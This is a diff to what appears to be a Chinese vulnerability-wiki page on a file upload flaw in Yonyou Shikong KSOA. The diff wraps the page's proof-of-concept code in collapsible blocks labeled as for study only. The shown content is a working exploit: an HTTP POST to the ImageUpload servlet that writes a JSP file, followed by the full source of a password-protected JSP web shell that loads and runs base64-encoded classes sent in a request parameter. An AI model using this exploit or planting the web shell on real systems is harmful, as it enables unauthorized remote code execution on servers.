@@ -35,8 +35,10 @@ app="用友-时空KSOA"
 
 发送数据包：
 
-```
-POST /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=1.jsp HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /servlet/com.sksoft.bill.ImageUpload?filepath=/&amp;filename=1.jsp HTTP/1.1
 Host: your-ip
 Pragma: no-cache
 Cache-Control: no-cache
@@ -50,10 +52,11 @@ Cookie: JSESSIONID=825A011F31259CCA1649D5DF4849635E
 Connection: close
 Content-Length: 1
 
-<%!
+&lt;%!
 your-payload
-%>
-```
+%&gt;</code></pre>
+
+</details>
 
 ![image-20230601102530120](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20230601102530120.png)
 
@@ -63,8 +66,10 @@ your-payload
 
 密码：passwd
 
-```jsp
-<%!
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-jsp">&lt;%!
     class U extends ClassLoader {
         U(ClassLoader c) {
             super(c);
@@ -84,14 +89,15 @@ your-payload
             return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
         }
     }
-%>
-<%
+%&gt;
+&lt;%
     String cls = request.getParameter("passwd");
     if (cls != null) {
         new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
     }
-%>
-```
+%&gt;</code></pre>
+
+</details>
 
 ---
 
